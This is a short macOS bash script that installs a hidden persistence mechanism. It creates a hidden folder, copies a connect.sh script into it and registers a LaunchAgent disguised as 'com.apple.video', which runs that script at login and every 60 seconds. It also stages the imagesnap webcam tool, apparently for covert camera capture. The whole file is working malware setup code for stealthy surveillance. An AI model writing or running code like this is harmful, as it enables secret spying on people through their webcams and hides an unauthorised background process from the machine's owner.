#!/bin/bash

#Create the hidden directory ~/.textedit
mkdir $HOME/.hidden

#Copy the script to hidden folder
cp connect.sh $HOME/.hidden/connect.sh

#Give the script permission to execute
chmod +x $HOME/.hidden/connect.sh

#Create directory if it doesn't already exist.
mkdir $HOME/Library/LaunchAgents

#Write the .plist to LaunchAgents
echo '
<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>com.apple.video</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>'$HOME'/.hidden/connect.sh</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>StartInterval</key>
        <integer>60</integer>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>
' > $HOME/Library/LaunchAgents/com.apple.video.plist

#Load the LaunchAgent
launchctl load $HOME/Library/LaunchAgents/com.apple.video.plist

#Copy imagesnap to the hidden directory
cp imagesnap $HOME/.hidden